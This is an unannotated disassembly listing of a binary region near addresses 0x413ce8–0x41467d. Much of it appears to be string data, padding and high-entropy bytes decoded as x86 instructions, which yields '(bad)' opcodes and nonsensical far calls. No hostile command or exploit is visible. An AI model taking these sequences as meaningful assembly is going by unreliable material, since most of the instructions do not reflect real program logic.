  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	and    ebp,esi
  413f02:	jo     0x413ec2
  413f04:	(bad)  
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	push   ebx
  413f0d:	add    eax,0x61d565a7
  413f12:	sub    ah,BYTE PTR ds:0x6ee78bcf
  413f18:	add    ebx,edi
  413f1a:	(bad)  
  413f1b:	retf   
  413f1c:	mov    edi,0x1e31ebfc
  413f21:	mov    bh,0xa3
  413f23:	mov    ds,WORD PTR [eax+eiz*4+0x10]
  413f27:	mov    edi,0x52670025
  413f2c:	shl    DWORD PTR [ebx+0x49],0xec
  413f30:	outs   dx,BYTE PTR ds:[esi]
  413f31:	leave  
  413f32:	push   ecx
  413f33:	pop    eax
  413f34:	les    eax,FWORD PTR [ebx]
  413f36:	stc    
  413f37:	mov    bh,0xda
  413f39:	xor    BYTE PTR ds:0x971decf3,ch
  413f3f:	mov    ah,0x9a
  413f41:	(bad)  [ebx]
  413f43:	adc    eax,0x9de4e685
  413f48:	xchg   ebx,eax
  413f49:	shl    BYTE PTR [ebp+0x4a28b8fd],cl
  413f4f:	adc    BYTE PTR [eax],ah
  413f51:	push   esp
  413f52:	leave  
  413f53:	sbb    DWORD PTR [eax+esi*4+0x3f],ebx
  413f57:	test   DWORD PTR [ebp-0x729b9af2],edx
  413f5d:	aad    0x2a
  413f5f:	(bad)  
  413f60:	sbb    ch,BYTE PTR [eax-0x396244e3]
  413f66:	fiadd  DWORD PTR [esi]
  413f68:	les    esp,FWORD PTR [ebp*8-0x1d6d57b9]
  413f6f:	jns    0x413f12
  413f71:	add    al,0xcd
  413f73:	xchg   ebx,eax
  413f74:	xlat   BYTE PTR ds:[ebx]
  413f75:	or     ch,al
  413f77:	cmp    ah,BYTE PTR [edx-0x491323da]
  413f7d:	nop
  413f7e:	mov    eax,0xdc5182fe
  413f83:	cmp    cl,0xd2
  413f86:	pop    esi
  413f87:	imul   edx,DWORD PTR [edx],0x92641fcb
  413f8d:	mov    eax,0x9284c047
  413f92:	test   al,0xb5
  413f94:	push   0xffffffe8
  413f96:	jo     0x413fa7
  413f98:	inc    DWORD PTR [ebx]
  413f9a:	int3   
  413f9b:	ret    0x8f35
  413f9e:	or     BYTE PTR [edi],ch
  413fa0:	adc    eax,0x96e128f8
  413fa5:	out    dx,eax
  413fa6:	jb     0x413f8c
  413fa8:	ret    
  413fa9:	nop
  413faa:	loopne 0x413f3f
  413fac:	add    al,0x79
  413fae:	xchg   DWORD PTR [ebx],edx
  413fb0:	pop    edx
  413fb1:	int    0x51
  413fb3:	inc    ebp
  413fb4:	cld    
  413fb5:	mov    esp,0xdd978207
  413fba:	rol    BYTE PTR [ebp-0x64],0x5d
  413fbe:	or     al,0xd2
  413fc0:	dec    esp
  413fc1:	or     al,BYTE PTR ds:0xa3237371
  413fc7:	mov    esp,0x51886646
  413fcc:	rcr    ebx,cl
  413fce:	pushf  
  413fcf:	fstp   QWORD PTR [ebx+0x6bb15633]
  413fd5:	xor    BYTE PTR [edx-0x758d66bb],0xdd
  413fdc:	sbb    esi,DWORD PTR [eax-0x18]
  413fdf:	cld    
  413fe0:	jge    0x413fc6
  413fe2:	imul   DWORD PTR ds:0x9132c38e
  413fe8:	fwait
  413fe9:	lahf   
  413fea:	dec    ebp
  413feb:	push   es
  413fec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fed:	add    BYTE PTR [ebp-0x7e],dl
  413ff0:	adc    bh,BYTE PTR [ebx-0xc]
  413ff3:	cli    
  413ff4:	jg     0x413fad
  413ff6:	test   eax,0x70f02587
  413ffb:	add    dh,BYTE PTR [edi+0x26]
  413ffe:	shr    dh,0xd3
  414001:	clc    
  414002:	mov    esp,0x43fd1a6b
  414007:	mov    edx,0xca34efb9
  41400c:	dec    edx
  41400d:	and    esi,eax
  41400f:	jae    0x414011
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xe8c1:0xb8d52e96
  414083:	aam    0xe0
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR [ecx+eax*1],al
  41408a:	add    BYTE PTR [eax],al
  41408c:	add    DWORD PTR [ebx+0x6d6d5363],edi
  414092:	aaa    
  414093:	mov    edi,0x6b5fdda9
  414098:	shr    bl,cl
  41409a:	std    
  41409b:	fs dec ecx
  41409d:	shl    DWORD PTR [eax-0x57],0x72
  4140a1:	mov    ebp,0xe4aef1c7
  4140a6:	xchg   edi,eax
  4140a7:	bound  edx,QWORD PTR [eax+eax*8]
  4140aa:	or     esp,DWORD PTR [eax]
  4140ac:	xor    dh,al
  4140ae:	lods   eax,DWORD PTR ds:[esi]
  4140af:	das    
  4140b0:	sub    ebp,DWORD PTR [ebx+0x5c]
  4140b3:	cmp    bl,bl
  4140b5:	fild   QWORD PTR ds:0x586a228a
  4140bb:	(bad)  [eax-0x4bf71e6b]
  4140c1:	out    0x1b,eax
  4140c3:	sbb    edx,esi
  4140c5:	and    eax,0x3690290e
  4140ca:	fsub   QWORD PTR [ecx-0xabf6870]
  4140d0:	and    al,0x54
  4140d2:	cmp    eax,0x8348559
  4140d7:	iret   
  4140d8:	test   eax,0x34999aed
  4140dd:	out    dx,eax
  4140de:	daa    
  4140df:	shr    BYTE PTR [esp+esi*4+0x5b8abb8f],1
  4140e6:	xlat   BYTE PTR ds:[ebx]
  4140e7:	mov    BYTE PTR [ebx+0x149178fe],ch
  4140ed:	sbb    esi,eax
  4140ef:	cmp    al,al
  4140f1:	aas    
  4140f2:	(bad)  
  4140f3:	adc    dh,BYTE PTR [esi+0x58]
  4140f6:	adc    eax,0x3c7fe265
  4140fb:	ret    
  4140fc:	aas    
  4140fd:	fld    st(4)
  4140ff:	shl    BYTE PTR cs:[eax-0x68],0xac
  414104:	mov    ebx,esp
  414106:	cmp    eax,0xe5918bab
  41410b:	jae    0x414106
  41410d:	dec    ebx
  41410e:	xchg   ebp,eax
  41410f:	and    al,0xa0
  414111:	outs   dx,BYTE PTR ds:[esi]
  414112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414113:	fwait
  414114:	mov    al,ds:0x7effc9dd
  414119:	jb     0x41417d
  41411b:	xchg   ebp,eax
  41411c:	rcr    ecx,cl
  41411e:	mov    ds,WORD PTR [edi]
  414120:	inc    edx
  414121:	mov    cl,BYTE PTR [ecx+0x35]
  414124:	cld    
  414125:	fst    QWORD PTR [edi]
  414127:	xor    eax,0x27198a51
  41412c:	sub    eax,0x5406c2bb
  414131:	(bad)  
  414132:	pop    eax
  414133:	xchg   ebx,eax
  414134:	fs xchg edx,eax
  414136:	add    al,BYTE PTR [eax+0x67]
  414139:	mov    esi,0x8f83ad6c
  41413e:	pusha  
  41413f:	ss call 0xeaa4:0x4e5a4687
  414147:	outs   dx,BYTE PTR ds:[esi]
  414148:	push   edx
  414149:	stos   DWORD PTR es:[edi],eax
  41414a:	sahf   
  41414b:	or     BYTE PTR ds:0xc88ba1b1,ch
  414151:	xor    DWORD PTR [edi],0x8ec420d5
  414157:	and    ah,0x60
  41415a:	or     ebx,DWORD PTR [ecx+0x64]
  41415d:	fmul   DWORD PTR [ebx+0x7196f885]
  414163:	jg     0x414192
  414165:	xchg   edx,eax
  414166:	pop    eax
  414167:	jb     0x4140f0
  414169:	mov    cl,BYTE PTR [eax+0x26]
  41416c:	mov    dl,0x37
  41416e:	hlt    
  41416f:	ror    DWORD PTR [esp+ecx*1],0xa1
  414173:	dec    esp
  414174:	xchg   edi,eax
  414175:	fstp   TBYTE PTR [edi+edx*8]
  414178:	pop    ds
  414179:	and    BYTE PTR [edx+esi*4],al
  41417c:	pop    edi
  41417d:	cld    
  41417e:	or     al,0x6c
  414180:	sbb    esi,DWORD PTR cs:[esi-0x41]
  414184:	add    BYTE PTR [eax+0x6a],0x5e
  414188:	ror    DWORD PTR [ebx-0x3],0x5
  41418c:	repnz mov ds:0x7bd2,al
	...
  4141f2:	add    BYTE PTR [eax],al
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	test   DWORD PTR [esi-0x7d],ebp
  414203:	mul    ah
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	sbb    al,0x80
  41420e:	pop    ecx
  41420f:	jle    0x414200
  414211:	and    BYTE PTR [eax+eiz*2-0x5041b1dc],0x38
  414219:	fisttp WORD PTR [ebp+0x338d43b9]
  41421f:	adc    edx,esi
  414221:	arpl   WORD PTR [esi],bx
  414223:	int    0x34
  414225:	out    0x81,al
  414227:	fs push ss
  414229:	push   cs
  41422a:	sbb    edx,DWORD PTR [edx-0x7e]
  41422d:	and    eax,0x917d5676
  414232:	lea    edi,[ebx+0x34]
  414235:	pop    eax
  414236:	adc    ebp,edx
  414238:	in     eax,0xc1
  41423a:	xor    BYTE PTR [ebx-0x7a],ch
  41423d:	cmovo  edx,DWORD PTR [ebx+0x3e]
  414241:	scas   eax,DWORD PTR es:[edi]
  414242:	in     eax,0xb4
  414244:	in     al,0x5c
  414246:	call   0x8a20:0x4765e2ec
  41424d:	nop
  41424e:	cmp    al,0xe5
  414250:	sbb    ah,BYTE PTR [edx-0x4e]
  414253:	inc    eax
  414254:	imul   esp,ebx,0x359e130c
  41425a:	mov    eax,ebx
  41425c:	inc    ebp
  41425d:	dec    ebx
  41425e:	sbb    BYTE PTR [eiz*1-0x1fde214e],cl
  414265:	push   eax
  414266:	xchg   edi,eax
  414267:	cwde   
  414268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414269:	fld    QWORD PTR [esp+edx*1]
  41426c:	push   ds
  41426d:	test   al,0xaa
  41426f:	push   ds
  414270:	(bad)  [ebx]
  414272:	sub    ch,BYTE PTR [edi+edx*4-0x39]
  414276:	enter  0xc19a,0xe1
  41427a:	shr    BYTE PTR [edi],0x46
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	mov    eax,0xd8ee387a
  414283:	fld    DWORD PTR [ecx]
  414285:	or     DWORD PTR [eax+0x3ef9a72e],esi
  41428b:	and    al,0xd3
  41428d:	test   cl,bh
  41428f:	fimul  WORD PTR [esi]
  414291:	mov    bh,0xef
  414293:	mov    eax,0x7d460cbe
  414298:	outs   dx,DWORD PTR ds:[esi]
  414299:	xor    eax,0x6199eae6
  41429e:	xchg   esp,eax
  41429f:	aas    
  4142a0:	adc    bh,BYTE PTR [esi+0x4e]
  4142a3:	pop    ecx
  4142a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142a5:	sahf   
  4142a6:	pushf  
  4142a7:	mov    ecx,0x36edb500
  4142ac:	mov    eax,ds:0x5b2f9b71
  4142b1:	stc    
  4142b2:	add    ecx,ecx
  4142b4:	xchg   ebp,eax
  4142b5:	pop    edx
  4142b6:	jae    0x414264
  4142b8:	loope  0x4142d9
  4142ba:	lods   eax,DWORD PTR ds:[esi]
  4142bb:	sar    BYTE PTR [esi+0x3e],1
  4142be:	ror    edi,1
  4142c0:	ins    DWORD PTR es:[edi],dx
  4142c1:	jl     0x4142cc
  4142c3:	mov    bl,0xe8
  4142c5:	or     esp,ebp
  4142c7:	xor    eax,0x83735a36
  4142cc:	loop   0x414309
  4142ce:	in     eax,0x97
  4142d0:	or     ebp,esp
  4142d2:	inc    ebp
  4142d3:	mov    ds:0xe229a1bc,al
  4142d8:	in     eax,dx
  4142d9:	fwait
  4142da:	sub    ebx,ecx
  4142dc:	mov    esp,0xbef4ad17
  4142e1:	fcom   QWORD PTR [ecx+0x3a]
  4142e4:	jns    0x414271
  4142e6:	icebp  
  4142e7:	scas   eax,DWORD PTR es:[edi]
  4142e8:	and    DWORD PTR [eax],eax
  4142ea:	mov    BYTE PTR [eax+ebx*8-0x2fdf4520],cl
  4142f1:	mov    esp,0x1f9dc071
  4142f6:	jl     0x4142af
  4142f8:	or     edi,DWORD PTR [esi-0x683cbb6]
  4142fe:	loop   0x4142bc
  414300:	xlat   BYTE PTR ds:[ebx]
  414301:	pop    esp
  414302:	mov    ebp,0xc3146b8a
  414307:	push   es
  414308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414309:	es mov al,0x45
  41430c:	xlat   BYTE PTR ds:[ebx]
  41430d:	push   esi
  41430e:	and    ebx,esi
	...
  414374:	add    DWORD PTR [ecx-0x2122293],eax
  41437a:	mov    cl,0xdd
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	scas   eax,DWORD PTR es:[di]
  414382:	mov    ebx,0xd4e869
  414387:	add    BYTE PTR [ecx+eax*1],al
  41438a:	add    BYTE PTR [eax],al
  41438c:	shl    BYTE PTR [esi-0x2e884fa9],cl
  414392:	test   BYTE PTR [eax],al
  414394:	xchg   esi,eax
  414395:	cdq    
  414396:	push   ss
  414397:	les    edi,FWORD PTR [ebx-0x60]
  41439a:	into   
  41439b:	jno    0x414399
  41439d:	fidivr WORD PTR [edi]
  41439f:	adc    eax,0x54959ba1
  4143a4:	in     al,0xbe
  4143a6:	mov    dh,0xe2
  4143a8:	cmp    al,0xc3
  4143aa:	pop    ss
  4143ab:	aam    0x57
  4143ad:	mov    ebp,0xd84b7333
  4143b2:	mov    bl,0x77
  4143b4:	test   ah,ah
  4143b6:	xor    BYTE PTR [ebp-0x29],0x1d
  4143ba:	xchg   ebp,eax
  4143bb:	or     eax,0x347ba822
  4143c0:	inc    ecx
  4143c1:	pusha  
  4143c2:	cmc    
  4143c3:	ficom  WORD PTR [edi]
  4143c5:	or     cl,bh
  4143c7:	neg    DWORD PTR [eax+0x4a]
  4143ca:	std    
  4143cb:	adc    eax,0xca2f8d2f
  4143d0:	jle    0x41440c
  4143d2:	or     BYTE PTR [esi-0x57f95824],0xa8
  4143d9:	or     BYTE PTR [ecx],bl
  4143db:	jo     0x414441
  4143dd:	xor    BYTE PTR [ebp+0x4fbae0ff],bh
  4143e3:	addr16 xchg ecx,eax
  4143e5:	cli    
  4143e6:	in     eax,dx
  4143e7:	jb     0x414466
  4143e9:	lods   eax,DWORD PTR ds:[esi]
  4143ea:	jnp    0x4143e9
  4143ec:	repnz ror DWORD PTR ss:[eax-0x79],1
  4143f1:	jg     0x414399
  4143f3:	cmc    
  4143f4:	ss retf 0x3561
  4143f8:	jmp    0xc4eb7682
  4143fd:	repz adc ebp,DWORD PTR [ecx-0x45c10185]
  414404:	sbb    ebx,DWORD PTR [eax+0x76c6da2c]
  41440a:	hlt    
  41440b:	add    eax,0xa8f9ec1
  414410:	xor    esi,DWORD PTR [edx+edi*4+0x1f]
  414414:	fdivr  st(1),st
  414416:	adc    dh,BYTE PTR [edi-0x7cadd495]
  41441c:	mov    esp,0x4e300cbb
  414421:	push   edi
  414422:	cli    
  414423:	sbb    ecx,esp
  414425:	pop    ds
  414426:	mov    ch,0xfc
  414428:	dec    ebx
  414429:	js     0x414466
  41442b:	cmp    al,0xf9
  41442d:	sbb    al,dh
  41442f:	bound  edi,QWORD PTR [edx]
  414431:	daa    
  414432:	or     esp,DWORD PTR [ecx+0x28b04912]
  414438:	fs pop ebp
  41443a:	and    esi,edi
  41443c:	shr    DWORD PTR [eax+0x2e7ba7d6],cl
  414442:	fidiv  WORD PTR [edx+0x32fd7bb2]
  414448:	popa   
  414449:	retf   
  41444a:	xchg   BYTE PTR [ecx-0x2d8e1b5e],dh
  414450:	mov    BYTE PTR [eax],ch
  414452:	and    eax,DWORD PTR [esi-0x503a8690]
  414458:	push   es
  414459:	dec    eax
  41445a:	inc    edx
  41445b:	fisttp QWORD PTR [edi+0x34]
  41445e:	adc    eax,edi
  414460:	test   BYTE PTR [ebx-0x4895c236],dl
  414466:	out    0x31,al
  414468:	dec    eax
  414469:	mov    eax,ds:0x4c88ec77
  41446e:	xchg   ebp,eax
  41446f:	dec    ax
  414471:	ret    0xba21
  414474:	out    0x51,al
  414476:	mov    bh,0xa6
  414478:	xor    esi,DWORD PTR [ecx-0x40]
  41447b:	arpl   WORD PTR [ebx],di
  41447d:	or     ch,dl
  41447f:	iret   
  414480:	sbb    bl,bl
  414482:	fwait
  414483:	sub    al,0x4f
  414485:	mov    ecx,0xfc607486
  41448a:	push   edx
  41448b:	call   0x0:0x6e6927d7
	...
  4144f2:	add    BYTE PTR [eax],al
  4144f4:	pop    ebx
  4144f5:	jae    0x414539
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x74]
  414501:	xor    DWORD PTR [eax],ecx
  414503:	test   eax,0xd5ec
  414508:	add    al,0x1
  41450a:	add    BYTE PTR [eax],al
  41450c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41450d:	sub    al,0xa8
  41450f:	push   ds
  414510:	int    0xd5
  414512:	sub    al,0x97
  414514:	rol    ebx,0x43
  414517:	mov    bl,0x8c
  414519:	sub    ebx,DWORD PTR [ebx-0x11bd2e02]
  41451f:	mov    ah,0x39
  414521:	ror    ah,1
  414523:	sub    eax,0xc8ca88cf
  414528:	popa   
  414529:	imul   eax,DWORD PTR ds:0x7494aae1,0xffffffea
  414530:	data16 test BYTE PTR [ebx],0x0
  414534:	out    dx,al
  414535:	ret    0x8dcd
  414538:	push   ebp
  414539:	xor    dl,BYTE PTR [edx]
  41453b:	repnz add al,BYTE PTR [ebx+0x9]
  41453f:	sbb    eax,0x2998b141
  414544:	jmp    0xd16318d8
  414549:	jecxz  0x4145bd
  41454b:	and    eax,ecx
  41454d:	or     bh,ch
  41454f:	xlat   BYTE PTR ds:[ebx]
  414550:	hlt    
  414551:	jp     0x414596
  414553:	and    al,0x3b
  414555:	push   esp
  414556:	pop    es
  414557:	adc    eax,0xb67a08da
  41455c:	call   0xdd19:0x165ff384
  414563:	jg     0x4145db
  414565:	add    eax,0x71cd58bc
  41456a:	out    0x32,eax
  41456c:	(bad)  
  41456d:	mov    ebp,0xcb367215
  414572:	dec    ebx
  414573:	or     cl,BYTE PTR [ebp*4-0x19d403d4]
  41457a:	clc    
  41457b:	mov    bl,BYTE PTR [edx]
  41457d:	adc    BYTE PTR ds:[ebx+edx*4-0x442d11ab],bh
  414585:	add    al,0xfd
  414587:	sbb    al,0xe4
  414589:	xor    bl,BYTE PTR [edi-0x51dcbb15]
  41458f:	push   0xffffff80
  414591:	dec    edi
  414592:	popa   
  414593:	push   0x36
  414595:	and    cl,BYTE PTR [ecx+0x1c315539]
  41459b:	out    dx,eax
  41459c:	aad    0x8c
  41459e:	pop    edi
  41459f:	test   ecx,0x92856e5f
  4145a5:	out    0x70,al
  4145a7:	lods   al,BYTE PTR ds:[esi]
  4145a8:	xchg   DWORD PTR [esi+0x5b3d202d],eax
  4145ae:	adc    DWORD PTR [esi+eax*8+0x47d54782],ebx
  4145b5:	add    bl,BYTE PTR ds:[eax-0x56]
  4145b9:	mov    edx,0x81d3d6d8
  4145be:	lods   al,BYTE PTR ds:[esi]
  4145bf:	xchg   BYTE PTR [esi],ah
  4145c1:	mov    ebp,0x3f6029e7
  4145c6:	loope  0x4145ec
  4145c8:	sbb    al,0xba
  4145ca:	arpl   WORD PTR [ebx],bx
  4145cc:	stc    
  4145cd:	jge    0x41459b
  4145cf:	ins    DWORD PTR es:[edi],dx
  4145d0:	inc    esp
  4145d1:	jbe    0x414643
  4145d3:	pop    ss
  4145d4:	rol    DWORD PTR [ebx+0x22],cl
  4145d7:	sub    BYTE PTR [edx-0x7d992428],0x54
  4145de:	out    0xcb,eax
  4145e0:	cmp    DWORD PTR [ebx+0x53],esi
  4145e3:	stos   DWORD PTR es:[edi],eax
  4145e4:	jne    0x414612
  4145e6:	das    
  4145e7:	add    al,BYTE PTR [edx-0x6e]
  4145ea:	dec    ebx
  4145eb:	mov    esp,0xcf1ba5ed
  4145f0:	loope  0x414606
  4145f2:	and    BYTE PTR [ebx-0x3a891da1],dh
  4145f8:	or     BYTE PTR [ebx],dh
  4145fa:	jecxz  0x41464f
  4145fc:	push   ebx
  4145fd:	mov    eax,ds:0xff60d0dc
  414602:	test   eax,0x9d310e3d
  414607:	ins    BYTE PTR es:[edi],dx
  414608:	fwait
  414609:	arpl   WORD PTR [ebx+0xec1fca4],cx
  41460f:	icebp  
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x8f
